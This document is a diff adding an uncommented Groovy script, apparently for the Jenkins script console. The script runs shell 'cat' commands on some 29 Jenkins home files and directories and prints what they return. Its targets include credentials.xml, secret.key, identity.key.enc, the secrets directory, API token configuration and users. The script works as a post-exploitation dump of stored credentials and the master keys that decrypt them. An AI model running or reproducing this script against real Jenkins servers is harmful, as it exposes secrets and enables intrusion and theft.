@@ -1,0 +1,145 @@
+def proc1 = "cat /var/lib/jenkins/config.xml".execute();
+def os1 = new StringBuffer();
+proc1.waitForProcessOutput(os1, System.err);
+println(os1.toString());
+
+def proc2 = "cat /var/lib/jenkins/credentials.xml".execute();
+def os2 = new StringBuffer();
+proc2.waitForProcessOutput(os2, System.err);
+println(os2.toString());
+
+def proc3 = "cat /var/lib/jenkins/hudson.model.UpdateCenter.xml".execute();
+def os3 = new StringBuffer();
+proc3.waitForProcessOutput(os3, System.err);
+println(os3.toString());
+
+def proc4 = "cat /var/lib/jenkins/hudson.plugins.emailext.ExtendedEmailPublisher.xml".execute();
+def os4 = new StringBuffer();
+proc4.waitForProcessOutput(os4, System.err);
+println(os4.toString());
+
+def proc5 = "cat /var/lib/jenkins/hudson.plugins.git.GitTool.xml".execute();
+def os5 = new StringBuffer();
+proc5.waitForProcessOutput(os5, System.err);
+println(os5.toString());
+
+def proc6 = "cat /var/lib/jenkins/identity.key.enc".execute();
+def os6 = new StringBuffer();
+proc6.waitForProcessOutput(os6, System.err);
+println(os6.toString());
+
+def proc7 = "cat /var/lib/jenkins/jenkins.install.InstallUtil.lastExecVersion".execute();
+def os7 = new StringBuffer();
+proc7.waitForProcessOutput(os7, System.err);
+println(os7.toString());
+
+def proc8 = "cat /var/lib/jenkins/jenkins.install.UpgradeWizard.state".execute();
+def os8 = new StringBuffer();
+proc8.waitForProcessOutput(os8, System.err);
+println(os8.toString());
+
+def proc9 = "cat /var/lib/jenkins/jenkins.model.JenkinsLocationConfiguration.xml".execute();
+def os9 = new StringBuffer();
+proc9.waitForProcessOutput(os9, System.err);
+println(os9.toString());
+
+def proc10 = "cat /var/lib/jenkins/jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml".execute();
+def os10 = new StringBuffer();
+proc10.waitForProcessOutput(os10, System.err);
+println(os10.toString());
+
+def proc11 = "cat /var/lib/jenkins/jenkins.security.QueueItemAuthenticatorConfiguration.xml".execute();
+def os11 = new StringBuffer();
+proc11.waitForProcessOutput(os11, System.err);
+println(os11.toString());
+
+def proc12 = "cat /var/lib/jenkins/jenkins.security.UpdateSiteWarningsConfiguration.xml".execute();
+def os12 = new StringBuffer();
+proc12.waitForProcessOutput(os12, System.err);
+println(os12.toString());
+
+def proc13 = "cat /var/lib/jenkins/jenkins.telemetry.Correlator.xml".execute();
+def os13 = new StringBuffer();
+proc13.waitForProcessOutput(os13, System.err);
+println(os13.toString());
+
+def proc14 = "cat /var/lib/jenkins/jobs".execute();
+def os14 = new StringBuffer();
+proc14.waitForProcessOutput(os14, System.err);
+println(os14.toString());
+
+def proc15 = "cat /var/lib/jenkins/logs".execute();
+def os15 = new StringBuffer();
+proc15.waitForProcessOutput(os15, System.err);
+println(os15.toString());
+
+def proc16 = "cat /var/lib/jenkins/nodeMonitors.xml".execute();
+def os16 = new StringBuffer();
+proc16.waitForProcessOutput(os16, System.err);
+println(os16.toString());
+
+def proc17 = "cat /var/lib/jenkins/nodes".execute();
+def os17 = new StringBuffer();
+proc17.waitForProcessOutput(os17, System.err);
+println(os17.toString());
+
+def proc18 = "cat /var/lib/jenkins/org.jenkinsci.main.modules.sshd.SSHD.xml".execute();
+def os18 = new StringBuffer();
+proc18.waitForProcessOutput(os18, System.err);
+println(os18.toString());
+
+def proc19 = "cat /var/lib/jenkins/plugins".execute();
+def os19 = new StringBuffer();
+proc19.waitForProcessOutput(os19, System.err);
+println(os19.toString());
+
+def proc20 = "cat /var/lib/jenkins/queue.xml".execute();
+def os20 = new StringBuffer();
+proc20.waitForProcessOutput(os20, System.err);
+println(os20.toString());
+
+def proc21 = "cat /var/lib/jenkins/queue.xml.bak".execute();
+def os21 = new StringBuffer();
+proc21.waitForProcessOutput(os21, System.err);
+println(os21.toString());
+
+def proc22 = "cat /var/lib/jenkins/secret.key".execute();
+def os22 = new StringBuffer();
+proc22.waitForProcessOutput(os22, System.err);
+println(os22.toString());
+
+def proc23 = "cat /var/lib/jenkins/secret.key.not-so-secret".execute();
+def os23 = new StringBuffer();
+proc23.waitForProcessOutput(os23, System.err);
+println(os23.toString());
+
+def proc24 = "cat /var/lib/jenkins/secrets".execute();
+def os24 = new StringBuffer();
+proc24.waitForProcessOutput(os24, System.err);
+println(os24.toString());
+
+def proc25 = "cat /var/lib/jenkins/updates".execute();
+def os25 = new StringBuffer();
+proc25.waitForProcessOutput(os25, System.err);
+println(os25.toString());
+
+def proc26 = "cat /var/lib/jenkins/userContent".execute();
+def os26 = new StringBuffer();
+proc26.waitForProcessOutput(os26, System.err);
+println(os26.toString());
+
+def proc27 = "cat /var/lib/jenkins/users".execute();
+def os27 = new StringBuffer();
+proc27.waitForProcessOutput(os27, System.err);
+println(os27.toString());
+
+def proc28 = "cat /var/lib/jenkins/workflow-libs".execute();
+def os28 = new StringBuffer();
+proc28.waitForProcessOutput(os28, System.err);
+println(os28.toString());
+
+def proc29 = "cat /var/lib/jenkins/workspace".execute();
+def os29 = new StringBuffer();
+proc29.waitForProcessOutput(os29, System.err);
+println(os29.toString());
+
